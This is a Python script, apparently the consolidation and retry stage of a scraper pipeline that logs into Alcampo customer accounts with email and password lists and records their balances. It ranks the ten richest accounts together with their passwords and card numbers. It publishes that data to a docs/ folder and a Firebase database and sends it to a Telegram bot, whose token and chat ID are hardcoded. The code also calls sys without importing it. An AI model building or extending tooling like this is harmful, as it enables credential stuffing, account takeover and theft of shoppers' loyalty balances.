import os
import glob
import json
import re
import argparse
import time
from datetime import datetime, timezone
import pandas as pd
import requests

def parse_args():
    parser = argparse.ArgumentParser(description="Merge and Retry Helper for Alcampo GitHub Actions Pipeline")
    parser.add_argument("--mode", choices=["check-timeouts", "final-merge"], required=True)
    parser.add_argument("--input-dir", default="./all_shards", help="Directory containing shard Excel files")
    parser.add_argument("--single-file", default=None, help="Inspect a specific single Excel file instead of a directory")
    parser.add_argument("--failed-json", default="failed_accounts.json", help="Path to write failed accounts JSON")
    parser.add_argument("--output-excel", default="REPORTE_DEFINITIVO_TELEGRAM.xlsx", help="Final output Excel path")
    return parser.parse_args()

def limpiar_saldo(saldo_str):
    if not saldo_str or pd.isna(saldo_str):
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", str(saldo_str))
    if match:
        return float(match.group(0).replace(',', '.'))
    return None

def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
    
    is_valid_token = bool(re.match(r"^\d+:[A-Za-z0-9_-]+$", token)) and token.lower() not in ("none", "null", "***", "undefined")
    
    is_valid_chat = False
    if chat_id and chat_id.lower() not in ("none", "null", "***", "undefined"):
        try:
            int(chat_id)
            is_valid_chat = True
        except ValueError:
            pass
            
    if not is_valid_token or not is_valid_chat:
        return "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU", -5049278431
        
    return token, int(chat_id)

def enviar_telegram(token, chat_id, texto, excel_path):
    try:
        url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
        r_msg = requests.post(url_msg, data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"}, timeout=15)
        print(f"📡 [TELEGRAM MENSAJE] Status: {r_msg.status_code} - Response: {r_msg.text[:120]}")
        
        if os.path.exists(excel_path):
            url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
            with open(excel_path, "rb") as f:
                r_doc = requests.post(url_doc, data={"chat_id": chat_id, "caption": "📊 Reporte Maestro Consolidado de Saldos Alcampo"}, files={"document": f}, timeout=25)
            print(f"📁 [TELEGRAM EXCEL] Status: {r_doc.status_code} - Response: {r_doc.text[:120]}")
        print("🎉 Telegram notificado con éxito.")
    except Exception as e:
        print(f"⚠️ Error enviando a Telegram: {e}")

def main():
    args = parse_args()
    
    if args.mode == "check-timeouts":
        if args.single_file and os.path.exists(args.single_file):
            files = [args.single_file]
        else:
            files = glob.glob(os.path.join(args.input_dir, "**", "*.xlsx"), recursive=True)
        print(f"🔎 Inspeccionando {len(files)} archivo(s)...")
        
        failed_accounts = []
        for f in files:
            try:
                df = pd.read_excel(f)
                for _, row in df.iterrows():
                    saldo = str(row.get("saldo", ""))
                    causa = str(row.get("causa_error", ""))
                    # Exclude authenticationError, Credenciales, and Call Center from retries
                    if ("Bloqueo/Timeout" in saldo or "Timeout" in causa) and ("authenticationError" not in saldo and "Credenciales" not in saldo and "bloqueada" not in saldo and "Call Center" not in saldo):
                        failed_accounts.append({
                            "email": str(row["email"]).strip(),
                            "password": str(row["password"]).strip()
                        })
            except Exception as e:
                print(f"Error leyendo {f}: {e}")
                
        print(f"🔴 Cuentas con timeout detectadas para reintento: {len(failed_accounts)}")

        # Check for stagnation / lack of progress in retries (Early Exit Guard)
        prev_history_file = "previous_failures.json"
        is_stagnant = False
        if len(failed_accounts) > 0 and os.path.exists(prev_history_file):
            try:
                with open(prev_history_file, "r", encoding="utf-8") as pf:
                    prev_data = json.load(pf)
                    prev_count = prev_data.get("count", 0)
                if len(failed_accounts) >= prev_count:
                    is_stagnant = True
                    print(f"⚠️ [EARLY EXIT] Los fallos no disminuyeron ({prev_count} → {len(failed_accounts)}). Abortando reintentos adicionales para proteger minutos de GitHub Actions.")
            except Exception as pe:
                print(f"Warning reading failure history: {pe}")

        if len(failed_accounts) > 0 and not is_stagnant:
            try:
                with open(prev_history_file, "w", encoding="utf-8") as pf:
                    json.dump({"count": len(failed_accounts)}, pf)
            except Exception:
                pass

        has_timeouts = "true" if (len(failed_accounts) > 0 and not is_stagnant) else "false"
        if len(failed_accounts) > 0 and not is_stagnant:
            with open(args.failed_json, "w", encoding="utf-8") as f:
                json.dump(failed_accounts, f, ensure_ascii=False, indent=2)
            print(f"💾 Cuentas fallidas guardadas en {args.failed_json}")
            
            # Update Firebase RTDB progress node for Cycle 2 retry state
            firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
            if firebase_url:
                try:
                    fb_base = firebase_url.strip().rstrip("/")
                    requests.patch(f"{fb_base}/progress.json", json={
                        "cycle": 2,
                        "retry_total": len(failed_accounts),
                        "is_finished": False
                    }, timeout=5)
                except Exception as fe:
                    print(f"Warning updating retry state in Firebase: {fe}")
        else:
            if os.path.exists(args.failed_json):
                os.remove(args.failed_json)
            
        # Write to GITHUB_OUTPUT if available
        if "GITHUB_OUTPUT" in os.environ:
            with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as f:
                f.write(f"has_timeouts={has_timeouts}\n")
                f.write(f"failed_count={len(failed_accounts)}\n")

    elif args.mode == "final-merge":
        files = glob.glob(os.path.join(args.input_dir, "**", "*.xlsx"), recursive=True)
        print(f"📂 Archivos acumulados para consolidación final: {len(files)}")
        
        dfs = []
        for f in files:
            try:
                df = pd.read_excel(f)
                filename = os.path.basename(f).lower()
                base_prio = 10
                if "cycle_" in filename:
                    try:
                        c_num = int(filename.split("cycle_")[1].split(".")[0].split("_")[0])
                        base_prio = 100 + c_num * 10
                    except Exception:
                        base_prio = 100
                elif "retry" in filename:
                    base_prio = 100

                prios = []
                for _, row in df.iterrows():
                    row_s = str(row.get("saldo", ""))
                    if "Tu Saldo es" in row_s:
                        prios.append(base_prio + 1000)
                    else:
                        prios.append(base_prio)
                df["_priority"] = prios
                dfs.append(df)
            except Exception as e:
                print(f"Error leyendo {f}: {e}")
                
        if not dfs:
            print("❌ No se encontraron archivos para consolidar.")
            token, chat_id = get_telegram_config()
            if token and chat_id:
                enviar_telegram(token, chat_id, "⚠️ <b>Alerta Alcampo Scraper</b>: La consolidación final no encontró archivos Excel de los shards. Verifica los logs de la Pasada 1.", "")
            return

        df_all = pd.concat(dfs, ignore_index=True)
        for col in ["email", "saldo", "card_number", "password", "_priority"]:
            if col not in df_all.columns:
                df_all[col] = ""
        df_all.sort_values(by=["_priority"], inplace=True)
        df_all.drop_duplicates(subset=["email"], keep="last", inplace=True)
        df_all.drop(columns=["_priority"], errors="ignore", inplace=True)
        
        # Build multi-sheet master excel
        df_success = df_all[df_all["saldo"].astype(str).str.contains("Tu Saldo es", na=False)].copy()
        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center|bloqueada", na=False, regex=True)].copy()
        df_errors = df_all[~df_all["email"].isin(df_success["email"]) & ~df_all["email"].isin(df_callcenter["email"])].copy()

        with pd.ExcelWriter(args.output_excel, engine="openpyxl") as writer:
            df_all.to_excel(writer, sheet_name="Todas las Cuentas", index=False)
            df_success.to_excel(writer, sheet_name="Exitosas con Saldo", index=False)
            df_callcenter.to_excel(writer, sheet_name="Bloqueadas Call Center", index=False)
            df_errors.to_excel(writer, sheet_name="Error Credenciales y Autenticacion", index=False)

        print(f"💾 Reporte consolidado final guardado en {args.output_excel}")
        
        # Calculate summary metrics
        total = len(df_all)
        saldo_total = 0.0
        cuentas_dinero = 0
        cuentas_cero = 0
        cuentas_error = len(df_errors) + len(df_callcenter)
        ranked = []
        top_10_json = []

        for _, row in df_success.iterrows():
            val = limpiar_saldo(row.get("saldo"))
            if val is not None:
                saldo_total += val
                email = str(row.get("email", "")).strip()
                password = str(row.get("password", "")).strip()
                card_num = row.get("card_number") if "card_number" in row else row.get("tarjeta") if "tarjeta" in row else None
                card_str = str(card_num).strip() if (card_num and not pd.isna(card_num)) else None
                
                if val > 0:
                    cuentas_dinero += 1
                    ranked.append((val, email, password, card_str))
                else:
                    cuentas_cero += 1

        ranked.sort(key=lambda x: x[0], reverse=True)
        top_10 = ranked[:10]
        top_10_str = "\n".join([f"   {i+1}. {item[1]} ({item[0]:.2f} €)" for i, item in enumerate(top_10)]) if top_10 else "   N/A"

        for val, email, password, card_str in top_10:
            top_10_json.append({
                "email": email,
                "password": password,
                "balance": round(val, 2),
                "card_number": card_str
            })

        # Save top_accounts.json locally and in docs/
        with open("top_accounts.json", "w", encoding="utf-8") as tf:
            json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

        docs_dir = os.path.join(os.path.dirname(__file__), "..", "docs")
        docs_dir = os.path.abspath(docs_dir)
        if os.path.exists(docs_dir):
            with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

        # Update account_status.json with final consolidated results
        try:
            sys.path.append(os.path.join(os.path.dirname(__file__), "..", "script_alcampo_activacion telegram"))
            from account_cooldown_manager import AccountCooldownManager
            cd_mgr = AccountCooldownManager()
            for _, row in df_all.iterrows():
                em = str(row.get("email", "")).strip()
                if not em:
                    continue
                s_val = str(row.get("saldo", ""))
                v_num = limpiar_saldo(s_val)
                is_ok = (v_num is not None and "Error" not in s_val and "No encontrado" not in s_val and "Call Center" not in s_val)
                cd_mgr.record_result(em, is_ok, error_msg=s_val)
            cd_mgr.save()
            print("✔ account_status.json consolidado guardado exitosamente.")
        except Exception as c_ex:
            print(f"Warning actualizando account_status.json: {c_ex}")

        # Update docs/history.json
        history_path = os.path.join(docs_dir, "history.json") if os.path.exists(docs_dir) else "history.json"
        history_data = []
        if os.path.exists(history_path):
            try:
                with open(history_path, "r", encoding="utf-8") as hf:
                    history_data = json.load(hf)
                    if not isinstance(history_data, list):
                        history_data = []
            except Exception:
                history_data = []

        next_id = 1
        if history_data:
            next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1

        successes = cuentas_dinero + cuentas_cero
        success_rate = (successes / total * 100) if total > 0 else 0.0

        new_history_entry = {
            "id": next_id,
            "date": datetime.now(timezone.utc).isoformat(),
            "version": "Multi-VM Matrix 2-Pass",
            "duration": 180.0,
            "checked": total,
            "success": successes,
            "zero": cuentas_cero,
            "error": cuentas_error,
            "success_rate": round(success_rate, 2),
            "total_balance": round(saldo_total, 2)
        }
        history_data.append(new_history_entry)

        with open(history_path, "w", encoding="utf-8") as hf:
            json.dump(history_data, hf, ensure_ascii=False, indent=4)

        # Push to Firebase Realtime DB
        firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
        if firebase_url:
            try:
                fb_base = firebase_url.strip().rstrip("/")
                requests.put(f"{fb_base}/top_accounts.json", json=top_10_json, timeout=10)
                requests.put(f"{fb_base}/history.json", json=history_data, timeout=10)
                
                prog_snap = {
                    "total": total,
                    "processed": total,
                    "success": successes,
                    "money": cuentas_dinero,
                    "zero": cuentas_cero,
                    "error": cuentas_error,
                    "total_balance": round(saldo_total, 2),
                    "is_finished": True,
                    "timestamp": time.time()
                }
                requests.put(f"{fb_base}/progress.json", json=prog_snap, timeout=10)
                print("✔ [FIREBASE] Sincronización exitosa de /top_accounts.json, /history.json y /progress.json")
            except Exception as fe:
                print(f"⚠️ Error al sincronizar con Firebase: {fe}")

        msg = (
            f"📊 <b>RESUMEN CONSOLIDADO FINAL (2 PASADAS MATRIZ)</b>\n\n"
            f"✅ Cuentas totales: {total}\n"
            f"💰 <b>Saldo Total Extraído:</b> {saldo_total:.2f} €\n"
            f"💎 Cuentas con dinero: {cuentas_dinero}\n"
            f"💤 Cuentas con saldo 0: {cuentas_cero}\n"
            f"⚠️ Cuentas con error / Call Center: {cuentas_error}\n\n"
            f"🏆 <b>Top 10 Cuentas con Mayor Saldo:</b>\n{top_10_str}\n\n"
            f"👀 <b>Ver Dashboard y Centro QR:</b>\n"
            f"https://alcampo.vercel.app/"
        )

        token, chat_id = get_telegram_config()
        if token and chat_id:
            enviar_telegram(token, chat_id, msg, args.output_excel)

if __name__ == "__main__":
    main()
